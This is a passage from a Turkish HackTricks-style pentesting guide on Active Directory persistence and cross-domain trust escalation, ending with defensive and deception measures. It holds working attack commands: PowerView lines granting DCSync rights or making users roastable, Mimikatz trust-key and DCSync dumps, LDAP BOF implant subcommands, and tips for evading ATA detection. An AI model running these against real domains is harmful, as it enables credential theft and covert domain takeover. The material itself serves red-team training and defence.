### Privesc as Persistence

Daha önce tartışılan bazı teknikler persistence için de kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md)'a karşı savunmasız hale getirmek

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kullanıcıları [**ASREPRoast**](asreproast.md)'a karşı savunmasız hale getirmek

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları vermek

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket saldırısı**, belirli bir servis için **meşru bir Ticket Granting Service (TGS) ticket'ı** oluşturur; bunun için **NTLM hash** (örneğin PC account hash'i) kullanılır. Bu yöntem servis ayrıcalıklarına **erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Bir **Golden Ticket saldırısı**, saldırganın Active Directory ortamında **krbtgt hesabının NTLM hash'ine** erişmesi ile ilgilidir. Bu hesap, tüm **Ticket Granting Ticket (TGT)**'ları imzalamada kullanıldığı için özeldir ve AD içinde kimlik doğrulama için kritik öneme sahiptir.

Saldırgan bu hash'i elde ettikten sonra herhangi bir hesap için **TGT** oluşturabilir (Silver ticket saldırısına benzer şekilde).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın golden ticket tespit mekanizmalarını atlayan** şekilde sahte oluşturulmuş golden ticket'lara benzer.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Bir hesabın sertifikalarına sahip olmak veya bunları talep edebilmek**, kullanıcının hesabında kalıcılık sağlamak için çok iyi bir yoldur (kullanıcı parolasını değiştirse bile):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Sertifikaları kullanarak domain içinde yüksek ayrıcalıklarla kalıcılık sağlamak** da mümkündür:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** objesi, **Domain Admins** ve **Enterprise Admins** gibi ayrıcalıklı grupların güvenliğini sağlamak için bu gruplara standart bir **Access Control List (ACL)** uygular ve yetkisiz değişiklikleri engeller. Ancak bu özellik istismar edilebilir; eğer bir saldırgan AdminSDHolder'ın ACL'ini düzenleyip sıradan bir kullanıcıya tam erişim veririrse, o kullanıcı tüm ayrıcalıklı gruplar üzerinde geniş kontrol kazanır. Bu güvenlik önlemi, yakından izlenmezse istenmeyen erişime yol açabilir.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **local administrator** hesabı vardır. Böyle bir makinada admin hakları elde ederek, local Administrator hash'i **mimikatz** kullanılarak çıkarılabilir. Ardından bu parolanın **kullanımını etkinleştirmek** için kayıt defteri değişikliği gerekir; bu sayede local Administrator hesabına uzaktan erişim sağlanabilir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bazı **özel izinleri** bir **kullanıcıya** belirli domain objeleri üzerinde **verebilirsiniz**, bu da o kullanıcının gelecekte **ayrıcalık yükseltmesi** yapmasını sağlar.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir **objenin** sahip olduğu **izinleri** **depolamak** için kullanılır. Eğer bir objenin security descriptor'ında küçük bir değişiklik yapabilirseniz, o obje üzerinde ayrıcalıklı bir gruba üye olmanıza gerek kalmadan çok ilginç ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Bellekte **LSASS**'ı değiştirerek tüm domain hesapları için **evrensel bir parola** oluşturun; bu sayede tüm hesaplara erişim sağlanır.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Kendi **SSP**'nizi oluşturarak makineye erişimde kullanılan **kimlik bilgilerini açık metin** halinde **yakalayabilirsiniz**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD içinde yeni bir **Domain Controller** kaydeder ve bunu, belirtilen objelere (SIDHistory, SPN'ler...) herhangi bir **log** bırakmadan **attribute** push etmek için kullanır. DA ayrıcalıkları ve **root domain** içinde olmanız gerekir.\
Yanlış veri kullanırsanız, oldukça çirkin loglar oluşabileceğini unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce LAPS parolalarını okuma için yeterli izne sahipseniz nasıl ayrıcalık yükseltebileceğinizi tartışmıştık. Ancak bu parolalar aynı zamanda **kalıcılık** sağlamak için de kullanılabilir.\
Bkz:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak görür. Bu, **tek bir domain'in ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.

### Basic Information

Bir [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir domain'deki bir kullanıcının başka bir domain'deki kaynaklara erişmesini sağlayan bir güvenlik mekanizmasıdır. İki domainin kimlik doğrulama sistemleri arasında bir bağlantı oluşturur ve doğrulama taleplerinin akmasını sağlar. Domainler bir trust kurduğunda, trust'ın bütünlüğü için önemli olan belirli **anahtarları** kendi **Domain Controller (DC)**'lerinde değiş tokuş ederler ve saklarlar.

Tipik bir senaryoda, bir kullanıcı **trusted domain** içindeki bir servise erişmek istediğinde, önce kendi domain'in DC'sinden bir **inter-realm TGT** talep etmelidir. Bu TGT, her iki domainin üzerinde anlaştığı paylaşılan bir **anahtar** ile şifrelenir. Kullanıcı daha sonra bu TGT'yi **trusted domain'in DC'sine** sunar ve servis için bir service ticket (**TGS**) alır. Trusted domain'in DC'si inter-realm TGT'yi doğruladıktan sonra geçerliyse TGS'yi verir ve kullanıcıya servise erişim hakları sağlanır.

**Adımlar**:

1. Bir **client bilgisayar** **Domain 1** içinde NTLM hash'ini kullanarak **Ticket Granting Ticket (TGT)** talep etmek için kendi **Domain Controller (DC1)**'ine başvurur.
2. DC1, istemci başarılı şekilde doğrulanırsa yeni bir TGT verir.
3. İstemci daha sonra **Domain 2** kaynaklarına erişmek için DC1'den bir **inter-realm TGT** ister.
4. Inter-realm TGT, iki yönlü domain trust'ın bir parçası olarak DC1 ve DC2 arasında paylaşılan bir **trust key** ile şifrelenir.
5. İstemci inter-realm TGT'yi **Domain 2'nin Domain Controller (DC2)**'sine götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi doğrular ve geçerliyse istemcinin erişmek istediği Domain 2 içindeki sunucu için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak istemci bu TGS'yi sunucuya sunar; bu TGS sunucunun hesap hash'i ile şifrelenmiştir ve Domain 2'deki servise erişim sağlar.

### Different trusts

Bir trust'ın **tek yönlü** veya **iki yönlü** olabileceğini unutmamak önemlidir. İki yönlü seçenekte, her iki domain birbirine güvenir; ancak **tek yönlü** trust ilişkisinde bir domain **trusted** (güvenilen) diğer ise **trusting** (güvenen) domain olur. Son durumda, **sadece trusted domain'den trusting domain içindeki kaynaklara erişebileceksiniz**.

Eğer Domain A, Domain B'ye trust veriyorsa, A trusting domain; B ise trusted olandır. Ayrıca, **Domain A** içinde bu bir **Outbound trust**; ve **Domain B** içinde bu bir **Inbound trust** olur.

**Farklı trust ilişkileri**

- **Parent-Child Trusts**: Aynı forest içinde yaygın bir kurulumdur; bir child domain, parent domain ile otomatik olarak iki yönlü geçişli (transitive) trust'a sahiptir. Bu, kimlik doğrulama taleplerinin parent ve child arasında sorunsuz akabileceği anlamına gelir.
- **Cross-link Trusts**: "shortcut trusts" olarak da adlandırılır; child domainler arasında referral süreçlerini hızlandırmak için kurulur. Karmaşık forest'larda kimlik doğrulama referansları genellikle forest root'a kadar çıkıp hedef domain'e inmek zorunda kalır; cross-link'ler bu yolculuğu kısaltır.
- **External Trusts**: Farklı, ilişkisiz domainler arasında kurulur ve doğası gereği non-transitive'dir. Microsoft dokümantasyonuna göre, external trust'lar forest dışındaki ve forest trust ile bağlı olmayan bir domaindeki kaynaklara erişim için kullanışlıdır. Güvenlik, external trust'larda SID filtering ile güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulur. Sık görülmese de, yeni domain ağaçları eklerken önemlidir; iki yönlü geçişliliği sağlar.
- **Forest Trusts**: İki forest root domain arasında kurulan iki yönlü geçişli bir trust türüdür ve SID filtering uygular.
- **MIT Trusts**: RFC4120-uyumlu Kerberos domainleri ile kurulan trust'lardır. Windows dışındaki Kerberos tabanlı sistemlerle entegrasyon gerektiren ortamlarda kullanılır.

#### Other differences in **trusting relationships**

- Bir trust ilişkisi aynı zamanda **transitive** (A B'ye güveniyor, B C'ye güveniyor, o zaman A C'ye güvenir) veya **non-transitive** olabilir.
- Bir trust ilişkisi **bidirectional trust** (her iki taraf da birbirine güvenir) veya **one-way trust** (sadece bir taraf diğerine güvenir) olarak kurulabilir.

### Attack Path

1. **Trusting ilişkilerini** enumerate edin
2. Herhangi bir **security principal** (user/group/computer) diğer **domain** kaynaklarına **erişim** hakkına sahip mi kontrol edin; belki ACE girdileriyle veya diğer domainin gruplarında yer almakla. **Domain'ler arası ilişkiler** arayın (trust büyük olasılıkla bunun için oluşturulmuştur).
1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Domain'ler arasında **pivot yapabilecek** **hesapları ele geçirin**.

Başka bir domain içindeki kaynaklara erişimi olan saldırganlar üç ana mekanizmadan erişim elde edebilir:

- **Local Group Membership**: Principal'lar makinelere, örneğin bir sunucudaki “Administrators” grubuna eklenmiş olabilir; bu durumda o makine üzerinde önemli kontrol kazanırlar.
- **Foreign Domain Group Membership**: Principal'lar yabancı domain içindeki grupların üyeleri olabilir. Ancak bu yöntemin etkinliği, trust'ın doğasına ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar özellikle bir **DACL** içindeki **ACE**'ler olarak belirtilmiş olabilir ve belirli kaynaklara erişim sağlayabilir. ACL'ler, DACL'ler ve ACE'lerin mekaniklerine derinlemesine bakmak isteyenler için, “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” whitepaper'ı değerli bir kaynaktır.

### Find external users/groups with permissions

Domain içindeki yabancı security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** kontrol edebilirsiniz. Bunlar **harici bir domain/forest**'ten gelen user/group nesneleri olacaktır.

Bunu **Bloodhound** veya powerview kullanarak kontrol edebilirsiniz:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Alt ormandan üst ormana ayrıcalık yükseltmesi
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Domain trusts'larını enumerate etmenin diğer yolları:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> İki adet **trusted key** vardır; biri _Child --> Parent_ için, diğeri ise _Parent_ --> _Child_ içindir.\
> Mevcut domain tarafından kullanılan anahtarı şu komutlarla görebilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection kullanarak trust'ı kötüye kullanıp Enterprise admin olarak child/parent domain'e yükseltin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context (NC)'nin nasıl istismar edilebileceğini anlamak kritik öneme sahiptir. Configuration NC, Active Directory (AD) ortamlarında bir forest genelinde yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest'teki her Domain Controller (DC) ile replikasyon yapılır; writable DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu istismar edebilmek için **SYSTEM privileges on a DC** gereklidir; tercihen bir child DC üzerinde.

**Link GPO to root DC site**

Configuration NC'nin Sites container'ı, AD forest içindeki tüm domain-joined bilgisayarların site bilgilerini içerir. Herhangi bir DC üzerinde **SYSTEM privileges on any DC** ile hareket ederek saldırganlar GPO'ları root DC site'larına linkleyebilir. Bu işlem, bu site'lara uygulanan politikaları manipüle ederek root domain'i tehlikeye atabilir.

Detaylı bilgi için [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) konusundaki araştırmaya bakılabilir.

**Compromise any gMSA in the forest**

Bir saldırı vektörü, domain içindeki ayrıcalıklı gMSA'ları hedef almayı içerir. gMSA'ların parolalarını hesaplamak için gerekli olan KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC üzerinde **SYSTEM privileges on any DC** ile KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA için parolaları hesaplamak mümkündür.

Detaylı analiz ve adım adım rehbere aşağıdan ulaşılabilir:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Tamamlayıcı delegated MSA saldırısı (BadSuccessor – migration attribute'larını kötüye kullanma):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Ek dış araştırma: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD objelerinin oluşturulmasını beklemeyi içerir. **SYSTEM privileges** ile bir saldırgan AD Schema'yı değiştirerek herhangi bir kullanıcıya tüm sınıflar üzerinde tam kontrol verebilir. Bu, yeni oluşturulan AD objeleri üzerinde yetkisiz erişim ve kontrol ile sonuçlanabilir.

Daha fazla okumak için [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)'a bakın.

**From DA to EA with ADCS ESC5**

ADCS ESC5 zafiyeti, forest içindeki herhangi bir kullanıcı olarak kimlik doğrulaması sağlayan bir certificate template oluşturmak için Public Key Infrastructure (PKI) objeleri üzerindeki kontrolü hedefler. PKI objeleri Configuration NC içinde bulunduğundan, yazılabilir bir child DC'nin ele geçirilmesi ESC5 saldırılarının gerçekleştirilmesini mümkün kılar.

Bu konu hakkında daha fazla detayı [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)'te okuyabilirsiniz. ADCS'nin olmadığı senaryolarda, saldırgan gerekli bileşenleri kurma yeteneğine sahiptir; bu konu [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) adresinde tartışılmaktadır.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Bu senaryoda **etki alanınız harici bir etki alanı tarafından trusted** konumdadır ve size onun üzerinde **belirsiz izinler** vermektedir. Etki alanınızdaki **hangi principal'ların harici etki alanı üzerinde hangi erişimlere sahip olduğunu** bulmanız ve ardından bunu sömürmeye çalışmanız gerekecek:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Orman Etki Alanı - Tek Yönlü (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Bu senaryoda **alanınız** **farklı bir domain**'den gelen bir principal'a bazı **yetkiler** veriyor.

Ancak, bir **domain is trusted** edildiğinde, trusted domain **öngörülebilir bir isimle bir kullanıcı oluşturur** ve parola olarak **trusted password**'u kullanır. Bu, trusting domain'den bir kullanıcıya erişip trusted domain'e girerek onu enumerate etmek ve daha fazla yetki elde etmeye çalışmak mümkün olduğu anlamına gelir:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Trusted domain'i ele geçirmenin bir diğer yolu, domain trust'ın **opposite direction**'ında oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu çok yaygın değildir).

Trusted domain'i ele geçirmenin başka bir yolu da, **trusted domain'den bir kullanıcının RDP ile giriş yapabildiği** bir makinede beklemektir. Saldırgan, RDP oturumu sürecine kod enjekte edebilir ve oradan **kurbanın origin domain'ine erişebilir**.\
Ayrıca, eğer **kurban sabit diskini mount ettiyse**, saldırgan **RDP session** sürecinden sabit diskin **startup folder**'ına **backdoor**'lar yerleştirebilir. Bu teknik **RDPInception** olarak adlandırılır.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust kötüye kullanımının azaltılması

### **SID Filtering:**

- Forest trust'ları arasındaki SID history özniteliğini kullanan saldırı riski, tüm inter-forest trust'larda varsayılan olarak etkin olan SID Filtering ile azaltılır. Bu, Microsoft'un tutumuna göre güvenlik sınırını domain yerine forest olarak kabul eden varsayıma dayanır.
- Ancak bir sorun vardır: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu nedenle zaman zaman devre dışı bırakılabilir.

### **Selective Authentication:**

- Ormanlararası trust'larda Selective Authentication kullanmak, iki forest'ten gelen kullanıcıların otomatik olarak authenticate edilmemesini sağlar. Bunun yerine, trusting domain veya forest içindeki domainlere ve sunuculara erişim için açık izinler gerekir.
- Bu önlemlerin writable Configuration Naming Context (NC)'nin istismarı veya trust hesabına yönelik saldırılara karşı koruma sağlamadığını not etmek önemlidir.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## Host üzerindeki implantlardan LDAP tabanlı AD kötüye kullanımı

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives'i x64 Beacon Object File'ları olarak yeniden uygular; bunlar tamamen bir on-host implant (ör. Adaptix C2) içinde çalışır. Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` ile derler, `ldap.axs`'i yükler ve beacon'dan `ldap <subcommand>` çağırırlar. Tüm trafik mevcut oturum güvenlik bağlamı üzerinden LDAP (389) ile signing/sealing veya LDAPS (636) ile otomatik sertifika güveni kullanarak gider; bu yüzden socks proxy'lere veya disk artefaktlarına gerek yoktur.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, ve `get-groupmembers` kısa isimleri/OU yollarını tam DN'lere çözer ve ilgili nesneleri döker.
- `get-object`, `get-attribute`, ve `get-domaininfo` rastgele öznitelikleri (security descriptor'lar dahil) ve `rootDSE`'den forest/domain metadata'sını çeker.
- `get-uac`, `get-spn`, `get-delegation`, ve `get-rbcd` roasting adaylarını, delegation ayarlarını ve LDAP'tan doğrudan mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) tanımlayıcılarını ortaya çıkarır.
- `get-acl` ve `get-writable --detailed` DACL'ı parse ederek trustees'i, hakları (GenericAll/WriteDACL/WriteOwner/attribute writes) ve mirası listeler; bu da ACL privilege escalation için doğrudan hedefler sağlar.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) operatörün OU haklarının olduğu yerlere yeni principal’ler veya bilgisayar hesapları yerleştirmesine izin verir. `add-groupmember`, `set-password`, `add-attribute`, and `set-attribute` write-property hakları bulunduğunda hedefleri doğrudan ele geçirir.
- ACL-focused commands such as `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, and `add-dcsync` WriteDACL/WriteOwner izinlerini herhangi bir AD nesnesi üzerinde parola sıfırlamalara, grup üyeliği kontrolüne veya DCSync replike ayrıcalıklarına çevirir ve PowerShell/ADSI artefaktları bırakmadan çalışır. `remove-*` karşılıkları enjekte edilmiş ACE’leri temizler.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` bir ele geçirilmiş kullanıcıyı anında Kerberoastable yapar; `add-asreproastable` (UAC toggle) parolaya dokunmadan AS-REP roasting için işaretler.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon’dan `msDS-AllowedToDelegateTo`, UAC flag’leri veya `msDS-AllowedToActOnBehalfOfOtherIdentity` öğelerini yeniden yazar, constrained/unconstrained/RBCD saldırı yollarını etkinleştirir ve uzaktan PowerShell veya RSAT gereksinimini ortadan kaldırır.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` kontrollü bir principal’in SID history’sine ayrıcalıklı SIDs enjekte eder (see [SID-History Injection](sid-history-injection.md)), LDAP/LDAPS üzerinden gizli erişim mirası sağlar.
- `move-object` bilgisayarların veya kullanıcıların DN/OU’sunu değiştirir; saldırganın varlıkları, önceden devredilen hakların bulunduğu OU’lara taşımasına ve sonrasında `set-password`, `add-groupmember` veya `add-spn` gibi istismarları gerçekleştirmesine olanak verir.
- Dar kapsamlı kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, vb.) operatör kimlik bilgilerini veya kalıcılığı elde ettikten sonra hızlı rollback yapılmasına izin vererek telemetriyi minimize eder.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Domain Admins sadece Domain Controllers’a giriş yapmasına izin verilmeli, diğer hostlarda kullanılmasından kaçınılmalıdır.
- **Service Account Privileges**: Servisler güvenlik amacıyla Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA ayrıcalıkları gerektiren görevler için süre sınırlı olmalıdır. Bu şu şekilde sağlanabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Aldatma uygulamak, parola süresi hiç bitmeyen veya Trusted for Delegation olarak işaretlenmiş tuzak kullanıcılar veya bilgisayarlar gibi tuzaklar kurmayı içerir. Ayrıntılı yaklaşım, belirli haklara sahip kullanıcılar oluşturmak veya bunları yüksek ayrıcalıklı gruplara eklemeyi içerir.
- Pratik bir örnek şu araçların kullanılmasını içerir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerinin dağıtımı hakkında daha fazlası için bakınız: [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Şüpheli göstergeler arasında olağandışı ObjectSID, nadiren gerçekleşen logon’lar, oluşturulma tarihleri ve düşük başarısız parola deneme sayıları bulunur.
- **General Indicators**: Potansiyel tuzak nesnelerin özniteliklerini gerçek olanlarla karşılaştırmak tutarsızlıkları ortaya çıkarabilir. Böyle aldatmaları tespit etmek için [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar yardımcı olabilir.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA tespitini önlemek için Domain Controllers üzerinde oturum enumerasyonu yapmaktan kaçınmak gerekir.
- **Ticket Impersonation**: Bilet oluşturmak için **aes** anahtarlarının kullanılması, NTLM’e düşürmeyi engelleyerek tespiti atlatmaya yardımcı olur.
- **DCSync Attacks**: ATA tespitinden kaçınmak için Domain Controller olmayan bir makineden yürütme tavsiye edilir; çünkü doğrudan Domain Controller’dan yürütme uyarıları tetikleyecektir.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
